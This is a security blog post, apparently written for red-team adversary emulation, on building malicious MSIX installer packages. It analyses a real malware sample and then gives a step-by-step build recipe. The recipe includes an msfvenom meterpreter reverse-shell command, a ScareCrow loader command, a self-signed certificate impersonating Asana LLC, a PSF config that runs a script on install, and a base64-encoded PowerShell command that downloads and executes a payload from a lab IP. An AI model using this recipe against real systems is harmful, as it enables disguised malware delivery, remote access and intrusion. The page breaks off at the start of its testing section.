<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=light data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><title>Creating malicious .MSIX files for initial access &#183; Trevor Saudi</title><meta name=title content="Creating malicious .MSIX files for initial access &#183; Trevor Saudi"><meta name=description content="Portfolio/blog"><link rel=canonical href=https://trevorsaudi.com/posts/2024-06-11_red_team06/><link type=text/css rel=stylesheet href=/css/main.bundle.min.8b56450ba99cc053901ef8853930f28f4125bd1e416ac7a511402051f4e2fe72c9daaf57ef13f832223954356701ab696fe00a9398ed342f97ae3c421270e287.css integrity="sha512-i1ZFC6mcwFOQHviFOTDyj0ElvR5BaselEUAgUfTi/nLJ2q9X7xP4MiI5VDVnAatpb+AKk5jtNC+XrjxCEnDihw=="><script type=text/javascript src=/js/appearance.min.badab316c9287a5a42a843e4eb45da65bb3d194a5a0f5fa4a3e516160e67df0b8c65f4f19a8e146436e29d583699e6cb41d6bbe99e05e1dbaa877763bad9f8e2.js integrity="sha512-utqzFskoelpCqEPk60XaZbs9GUpaD1+ko+UWFg5n3wuMZfTxmo4UZDbinVg2mebLQda76Z4F4duqh3djutn44g=="></script>
<script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.5ffdd39e73bd1438c0f4ff42f13915f067c633da22f60efa62139a4c51b972622badb1157d4aa4322634b55c8a2dc5ddfbd3917426df1c02d7b69362030197da.js integrity="sha512-X/3TnnO9FDjA9P9C8TkV8GfGM9oi9g76YhOaTFG5cmIrrbEVfUqkMiY0tVyKLcXd+9ORdCbfHALXtpNiAwGX2g==" data-copy=Copy data-copied=Copied></script>
<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:title" content="Creating malicious .MSIX files for initial access"><meta property="og:description" content="Introduction # I recently worked on a project involving adversary emulation of the BlackCat/ALPHV ransomware operation."><meta property="og:type" content="article"><meta property="og:url" content="https://trevorsaudi.com/posts/2024-06-11_red_team06/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-06-11T00:00:00+00:00"><meta property="article:modified_time" content="2024-06-11T00:00:00+00:00"><meta property="og:site_name" content="Trevor Saudi"><meta name=twitter:card content="summary"><meta name=twitter:title content="Creating malicious .MSIX files for initial access"><meta name=twitter:description content="Introduction # I recently worked on a project involving adversary emulation of the BlackCat/ALPHV ransomware operation."><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Posts","name":"Creating malicious .MSIX files for initial access","headline":"Creating malicious .MSIX files for initial access","abstract":"Introduction # I recently worked on a project involving adversary emulation of the BlackCat\/ALPHV ransomware operation.","inLanguage":"en","url":"https:\/\/trevorsaudi.com\/posts\/2024-06-11_red_team06\/","author":{"@type":"Person","name":"Trevor Saudi"},"copyrightYear":"2024","dateCreated":"2024-06-11T00:00:00\u002b00:00","datePublished":"2024-06-11T00:00:00\u002b00:00","dateModified":"2024-06-11T00:00:00\u002b00:00","keywords":["Red Teaming","Malware Development","MSIX","SSL","Initial Access"],"mainEntityOfPage":"true","wordCount":"1610"}]</script><meta name=author content="Trevor Saudi"><link href=https://github.com/trevorsaudi rel=me><link href=https://www.linkedin.com/in/trevor-saudi-9275b8186 rel=me></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 bg-neutral text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral max-w-7xl"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 dark:bg-neutral-600 focus:translate-y-0" href=#main-content><span class="font-bold ltr:pr-2 rtl:pl-2 text-primary-600 dark:text-primary-400">&darr;</span>Skip to main content</a></div><header class="flex justify-between py-6 font-semibold sm:items-center sm:py-10 text-neutral-900 dark:text-neutral print:hidden"><div></div><nav><ul class="flex flex-col list-none sm:flex-row"><li class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/ title>Home</a></li><li class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/posts/ title=Posts>Posts</a></li><li class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/about/ title>About</a></li><li class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/tags/ title=Tags>Tags</a></li><li class="ltr:text-right rtl:text-left ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><button id=search-button class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative inline-block align-text-bottom icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></li></ul></nav></header><div class=relative><main id=main-content class=grow><article><header class=max-w-prose><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class="inline hidden"><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/></a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/>Posts</a><span class="px-1 text-primary-500">/</span></li><li class="inline hidden"><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/2024-06-11_red_team06/>Creating malicious .MSIX files for initial access</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Creating malicious .MSIX files for initial access</h1><div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime="2024-06-11 00:00:00 +0000 UTC">11 June 2024</time><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">8 mins</span></div></div></header><section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert"><div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last"><div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden"><details open class="mt-0 overflow-hidden rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 lg:mt-3"><summary class="block py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700">Table of Contents</summary><div class="py-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#the-msix-file-format>The MSIX File Format</a><ul><li><a href=#1-package-payload>1. Package Payload</a></li><li><a href=#2-footprint-files>2. Footprint Files</a></li></ul></li><li><a href=#package-support-framework>Package Support Framework</a><ul><li><a href=#startingscriptwrapperps1>StartingScriptWrapper.ps1</a></li></ul></li><li><a href=#analysis-of-a-malicious-sample>Analysis of a malicious sample</a><ul><li><a href=#appxmanifest>AppxManifest</a></li><li><a href=#configjson>Config.json</a></li><li><a href=#startingscriptwrapper>StartingScriptWrapper</a></li><li><a href=#usjzy>usJzY</a></li></ul></li><li><a href=#building-a-malicious-msix-for-initial-access>Building a malicious msix for Initial Access</a><ul><li><a href=#1-setting-up-the-msix-packaging-tool-and-our-setup-file>1. Setting up the MSIX packaging tool and our setup file</a></li><li><a href=#2-the-implant-being-staged>2. The implant being staged</a></li><li><a href=#3-create-an-ssl-certificate>3. Create an SSL certificate</a></li><li><a href=#4-bundle-the-package-and-stage-our-loader>4. Bundle the package and stage our loader</a></li></ul></li><li><a href=#testing-our-malicious-sample>Testing our malicious sample</a></li></ul></nav></div></details></div></div><div class="min-w-0 min-h-0 max-w-prose"><style>@import 'https://cdn.rawgit.com/lonekorean/gist-syntax-themes/d49b91b3/stylesheets/one-dark.css';@import 'https://fonts.googleapis.com/css?family=Open+Sans';*,::before,::after{border-style:none;font:16px}body{margin:20px;font:16px open sans,sans-serif}.center{display:inline-block;margin-left:60px;margin-top:-20px}</style><p><figure><img class="my-0 rounded-md" src=/posts/2024-06-11_red_team06/images/logo.png alt=image></figure></p><h2 id=introduction class="relative group">Introduction <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#introduction aria-label=Anchor>#</a></span></h2><ul><li>I recently worked on a project involving adversary emulation of the <code>BlackCat/ALPHV ransomware operation</code>. Part of the observed TTPs was abuse of the MSIX file format to create malware for initial access. These files come in (.msix) file extension which is a Windows installer package.<br></li><li>In this article, we will go over the <code>.msix</code> file format to understand how exactly this package format can be used to execute malicious code on an unsuspecting victim. We will then analyze a malicious sample and further attempt to recreate and test it in a virtual environment.</li></ul><h2 id=the-msix-file-format class="relative group">The MSIX File Format <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#the-msix-file-format aria-label=Anchor>#</a></span></h2><ul><li>Packaging of files in Windows has undergone several changes over the course of years which has led to the rise of various packaging file formats such as the <code>EXE, MSI, APPX</code> and a newer generation such as the MSIX which combines features from the MSI and the APPX packaging.</li><li>Packaging is important for delivery and distribution of applications as it enables a simplified way of deploying and installing files by packaging all the necessary components and libraries into a single package that is straightforward to use.</li><li>The general MSIX file format can be deconstructed as shown:</li></ul><img src=/posts/2024-06-11_red_team06/images/msix.png><h3 id=1-package-payload class="relative group">1. Package Payload <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#1-package-payload aria-label=Anchor>#</a></span></h3><ul><li><code>Application Files</code>: This section contains the necessary applications required for the packaged application to run. These can be EXEs, DLLs, Config files, resource files or any other type of file.</li></ul><h3 id=2-footprint-files class="relative group">2. Footprint Files <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#2-footprint-files aria-label=Anchor>#</a></span></h3><ul><li><code>AppxManifest.xml</code>: This file contains metadata about the app package such as the entry points, capabilities, names of the package, version, publisher, dependencies, etc.</li><li><code>AppxBlockMap.xml</code>: To ensure file integrity, this file will contain the checksums of all the files in the package</li><li><code>AppxSignature.p7x</code>: The digital signature verifying the publisher&rsquo;s identity and ensures that a package has not been tampered with</li><li><code>CodeIntegrity.cat</code>: This file keeps a cryptographic catalogue file(hence the extension name) to ensure integrity and security of the package</li></ul><h2 id=package-support-framework class="relative group">Package Support Framework <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#package-support-framework aria-label=Anchor>#</a></span></h2><ul><li><p>The <code>Package Support Framework (PSF)</code>, is an open source kit in windows designed to facilitate installation and operation of applications in Windows. It helps one apply fixes to an application without modifying code.</p></li><li><p>It allows for extensive configuration to tailor the behaviour of applications. This customization allows resolving of specific compatibility issues without needing to modify the original code.</p></li></ul><img src=/posts/2024-06-11_red_team06/images/psf.png><ul><li><p>In the diagram above, we see the interaction between the PSF and the packaged application at runtime. Let&rsquo;s discuss the various components.</p><ul><li><code>Config.JSON</code>: Contains settings and parameters for the PSF.</li><li><code>PsfLauncher.exe</code>: The initial launcher that initiates the framework.</li><li><code>Runtime Manager dll</code>: Dll responsible for managing runtime operations within the framework</li><li><code>Runtime fix dll</code>: Dll that provides runtime fixes and patches required by the application</li></ul></li></ul><h3 id=startingscriptwrapperps1 class="relative group">StartingScriptWrapper.ps1 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#startingscriptwrapperps1 aria-label=Anchor>#</a></span></h3><ul><li><code>PSF</code> can be used to define post-installation scripts, which will be executed either before or after the application that was packaged has been run.</li><li>To perform this, a configuration item called the <code>StartingScriptWrapper</code> can be defined to tell PSF to run a script after the packaged application finishes installing.</li><li>We can use this to run scripts to stage our implants for Initial Access</li></ul><h2 id=analysis-of-a-malicious-sample class="relative group">Analysis of a malicious sample <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#analysis-of-a-malicious-sample aria-label=Anchor>#</a></span></h2><ul><li>Let us look at a malicious <a target=_blank href=https://bazaar.abuse.ch/sample/bdd89826ab8d3e3c03833b1ea8e4b0a34c80f13bfa5882e5b82f896cec41d141>sample</a> from malwarebazaar.</li><li>Once you&rsquo;ve downloaded and unzipped the sample, you will be presented with the following folder structure</li></ul><img src=/posts/2024-06-11_red_team06/images/unzippedmsix.png><ul><li><p>In this example, the packaged msix does not contain the target application being installed (it was probably omitted by the original poster) but, it utilizes the Package Support Framework. We can see the psflauncher and the necessary DLLs to ensure its correct functionality. So we know that the malware is going to be executing a script when it is installed on a system.</p></li><li><p>4 files are of interest to us:</p><ol><li>AppxManifest</li><li>Config.json</li><li>StartingScriptWrapper</li><li>usJzY</li></ol></li></ul><h3 id=appxmanifest class="relative group">AppxManifest <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#appxmanifest aria-label=Anchor>#</a></span></h3><ul><li>I highlighted 2 important sections here. The properties and the applications section.</li></ul><img src=/posts/2024-06-11_red_team06/images/appxmanifest.png><ul><li>The <code>properties</code> section contains details identifying the application such as the name, description and the logo that the app uses.</li><li>In the <code>applications</code> section, we can see the PSF executable being launched. There is also a notepad shortcut being created in the common programs folder.</li><li>The <code>Capabilities section</code> is used to specify system capabilities that the application requires in order to grant it access to some system resources and functionalities. Our malware is requesting full trust/unrestricted access to system resources via the <code>runFullTrust</code> capability.</li></ul><h3 id=configjson class="relative group">Config.json <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#configjson aria-label=Anchor>#</a></span></h3><ul><li>This is where things start to get interesting. We can see the various parameters being used in the configuration</li></ul><img src=/posts/2024-06-11_red_team06/images/configfile.png><ol><li>The PSF executable will be launched.</li><li><code>scriptExecutionMode</code> has been set to <code>RemoteSigned</code>, which allows scripts that are downloaded from the internet to run if signed by a trusted publisher.</li><li>The <code>start script</code> section defines <code>usJzY.ps1</code> as the script that will be executed at the start.</li><li><code>showWindow</code> has been set to <code>false</code>, meaning the powershell script will run in the background without invoking the command window.</li></ol><h3 id=startingscriptwrapper class="relative group">StartingScriptWrapper <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#startingscriptwrapper aria-label=Anchor>#</a></span></h3><ul><li>The <code>StartingScriptWrapper</code> is required by the PSF to be able to run the target script. The file below is included by default without any special modifications.</li></ul><img src=/posts/2024-06-11_red_team06/images/startingsciptwrapper.png><h3 id=usjzy class="relative group">usJzY <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#usjzy aria-label=Anchor>#</a></span></h3><ul><li>Finally, we have the target script that is being executed by PSF.</li></ul><br><script src=https://gist.github.com/trevorsaudi/6d89accab3b06d02048fdd33d6d22bc1.js></script><ul><li><p>In summary, this is what the script is performing:</p><ol><li>Starts as a background job and collects some system information such as the domain name, AV software present in the system and the domain name (line 2-11)</li><li>Pulls a suspicious script from a remote URL and executes it. (line 20-80)</li><li>Finally opens <a href=https://asana.com>https://asana.com</a> in the browser then waits for the background job to finish executing before exiting.</li></ol></li><li><p>This is what will contain the main logic for the implant being staged.</p></li></ul><h2 id=building-a-malicious-msix-for-initial-access class="relative group">Building a malicious msix for Initial Access <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#building-a-malicious-msix-for-initial-access aria-label=Anchor>#</a></span></h2><ul><li>Now that we have a solid understanding of the file structure. Let us construct our own malicious MSIX payload that installs an application before executing our target malware.</li></ul><h3 id=1-setting-up-the-msix-packaging-tool-and-our-setup-file class="relative group">1. Setting up the MSIX packaging tool and our setup file <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#1-setting-up-the-msix-packaging-tool-and-our-setup-file aria-label=Anchor>#</a></span></h3><ul><li>First, you will need to install the <code>MSIX packaging tool</code> from the Microsoft Store</li></ul><img src=/posts/2024-06-11_red_team06/images/msixpackagingtool.png><ul><li>You will also need the target application being packaged. I used Asana for this example.</li></ul><h3 id=2-the-implant-being-staged class="relative group">2. The implant being staged <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#2-the-implant-being-staged aria-label=Anchor>#</a></span></h3><ul><li>We can quickly create a simple implant for the initial access. I will utilize an awesome repo called Scarecrow which I came across a while back that can create payloads that mimics reputable sources.</li><li>We create our shellcode with msfvenom</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfvenom -p windows/x64/meterpreter/reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>192.168.75.128 <span class=nv>LPORT</span><span class=o>=</span><span class=m>9001</span> -f raw &gt; protection.bin
</span></span></code></pre></div><ul><li>Then generate the loader using Scarecrow</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./scarecrow -I protection.bin -domain www.microsoft.com -encryptionmode AES 
</span></span></code></pre></div><img src=/posts/2024-06-11_red_team06/images/scarecroww.png><ul><li>Host the final loader</li></ul><img src=/posts/2024-06-11_red_team06/images/server.png><h3 id=3-create-an-ssl-certificate class="relative group">3. Create an SSL certificate <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#3-create-an-ssl-certificate aria-label=Anchor>#</a></span></h3><ul><li>When running the MSIX file, Windows will check for the <code>digital signature</code> of the file to ensure it is legitimate and has not been tampered with. If you were to create an MSIX file without signing it, Windows will throw an error to you rejecting the installation process.</li><li>Threat actors will buy or use stolen certificates in order to create legitimately signed files. For this example, we will work with our own <code>self-signed certificate</code>, which we will install the corresponding public key on the target machine in order to bypass the warnings and errors.</li></ul><ol><li>Create a new self-signed certificate</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>New-SelfSignedCertificate</span> <span class=n>-CertStoreLocation</span> <span class=s2>&#34;Cert:\CurrentUser\My&#34;</span> <span class=n>-TextExtension</span> <span class=vm>@</span><span class=p>(</span><span class=s2>&#34;2.5.29.37={text}1.3.6.1.5.5.7.3.3&#34;</span><span class=p>,</span> <span class=s2>&#34;2.5.29.19={text}&#34;</span><span class=p>)</span><span class=n>-Type</span> <span class=n>Custom</span> <span class=n>-KeyUsage</span> <span class=n>DigitalSignature</span> <span class=n>-Subject</span> <span class=s2>&#34;Asana LLC&#34;</span> <span class=n>-FriendlyName</span> <span class=s2>&#34;Asana LLC&#34;</span>
</span></span></code></pre></div><p>Subject must much the MSIX&rsquo;s Publisher attribute value.</p><ul><li>You can find the thumbprint of the certificate like this</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Set-Location</span> <span class=n>Cert</span><span class=err>:</span><span class=p>\</span><span class=n>CurrentUser</span><span class=p>\</span><span class=n>My</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ChildItem</span> <span class=p>|</span> <span class=nb>Format-Table</span> <span class=n>Subject</span><span class=p>,</span> <span class=n>FriendlyName</span><span class=p>,</span> <span class=n>Thumbprint</span>
</span></span></code></pre></div><ol start=2><li>Export the private key which we will use to sign the MSIX</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$password</span> <span class=p>=</span> <span class=nb>ConvertTo-SecureString</span> <span class=n>-Force</span> <span class=n>-AsPlainText</span> <span class=n>-String</span> <span class=n>pass123</span>
</span></span><span class=line><span class=cl><span class=nb>Export-PfxCertificate</span> <span class=n>-Password</span> <span class=nv>$password</span> <span class=n>-cert</span> <span class=s2>&#34;Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BBE95D792&#34;</span> <span class=n>-FilePath</span>  <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Saudi</span><span class=p>\</span><span class=n>cert</span><span class=p>.</span><span class=py>pfx</span>
</span></span></code></pre></div><ol start=3><li>Export the public key which we will install in the victim&rsquo;s computer</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Export-Certificate</span> <span class=n>-cert</span> <span class=s2>&#34;Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BBE95D792&#34;</span> <span class=n>-FilePath</span> <span class=s1>&#39;C:\Users\Saudi\cert.cer&#39;</span>
</span></span></code></pre></div><img src=/posts/2024-06-11_red_team06/images/certificate.png><ul><li>Since this is a self-signed SSL for testing purposes, you can install the security certificate on the victim as shown:</li></ul><img src=/posts/2024-06-11_red_team06/images/installcert.png>
<img src=/posts/2024-06-11_red_team06/images/localmachine.png><ul><li>Install the cert in the Trusted Root Certification Authorities</li></ul><img src=/posts/2024-06-11_red_team06/images/rootcert.png><h3 id=4-bundle-the-package-and-stage-our-loader class="relative group">4. Bundle the package and stage our loader <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#4-bundle-the-package-and-stage-our-loader aria-label=Anchor>#</a></span></h3><ul><li>Select the task and follow through the prompts</li></ul><img src=/posts/2024-06-11_red_team06/images/msixpackage1.png><ul><li>Select the Asana setup file as the installer being packaged and select the pfx certificate we generated.</li></ul><img src=/posts/2024-06-11_red_team06/images/asanainstaller.png><ul><li>You can skip the Accelerator section. The package will automatically install in the system as shown</li></ul><img src=/posts/2024-06-11_red_team06/images/installation.png><ul><li>Ensure the package has an entry point as shown. We will edit the entry point in the manifest file later on to point to our psflauncher executable</li></ul><img src=/posts/2024-06-11_red_team06/images/entrypoint.png><ul><li>Here in the Create New Package Section, we go to the package editor to add the PSF binaries and config file to our package to give it PSF support.</li></ul><img src=/posts/2024-06-11_red_team06/images/packageeditor.png><ul><li>In the package editor, click on package files, right-click on the &ldquo;Package&rdquo; and add the following appropriate files</li></ul><img src=/posts/2024-06-11_red_team06/images/rightclick.png width=1000px;>
<img src=/posts/2024-06-11_red_team06/images/filestocopy.png width=1000px;><ul><li>You can edit files directly in the package editor by right-clicking and selecting edit. Let&rsquo;s modify the config file to point to our staging script called Hotfix.ps1. In this example, I enabled the powershell window to debug any errors.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;applications&#34;</span><span class=o>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;id&#34;</span><span class=o>:</span> <span class=s2>&#34;ASANA&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;executable&#34;</span><span class=o>:</span> <span class=s2>&#34;asana.exe&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;scriptExecutionMode&#34;</span><span class=o>:</span> <span class=s2>&#34;-ExecutionPolicy Unrestricted&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;startScript&#34;</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;waitForScriptToFinish&#34;</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;runOnce&#34;</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	      <span class=s2>&#34;timeOut&#34;</span><span class=o>:</span> <span class=mi>30000</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;showWindow&#34;</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;scriptPath&#34;</span><span class=o>:</span> <span class=s2>&#34;Hotfix.ps1&#34;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ul><li>Create the <code>hotfix.ps1</code> file in a different window. We will add a powershell command that pulls our loader from the staging server and executes it</li></ul><img src=/posts/2024-06-11_red_team06/images/cyberchef.png width=1000px;><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powershell</span> <span class=n>-enc</span> <span class=s2>&#34;dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADcANQAuADEAMgA4AC8AMgA0ADoAOQAwADAAMQAvAEgAbwB0AGYAaQB4AC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADUAOwBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA=&#34;</span>
</span></span></code></pre></div><ul><li>Add the <code>hotfix.ps1</code> staging script</li></ul><img src=/posts/2024-06-11_red_team06/images/hotfix.png width=1000px;><ul><li>Back to the manifest file, let&rsquo;s change the launch executable to our PSF binary so that the hotfix.ps1 can be executed post install</li></ul><img src=/posts/2024-06-11_red_team06/images/manifest.png><ul><li>In this section, take note of the Application ID defined. We will also modify the executable value</li></ul><img src=/posts/2024-06-11_red_team06/images/entrypoint1.png><ul><li>Change it to point to the psf executable:</li></ul><img src=/posts/2024-06-11_red_team06/images/psflauncher.png><ul><li>Save and exit. Finally create your MSIX file.</li></ul><h2 id=testing-our-malicious-sample class="relative group">Testing our malicious sample <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#testing-our-malicious-sample aria-label=Anchor>#</a></span></h2><div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"><span class="ltr:pr-3 rtl:pl-3 text-primary-400"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M506.3 417 293 53c-16.33-28-57.54-28-73.98.0l-213.2 364C-10.59 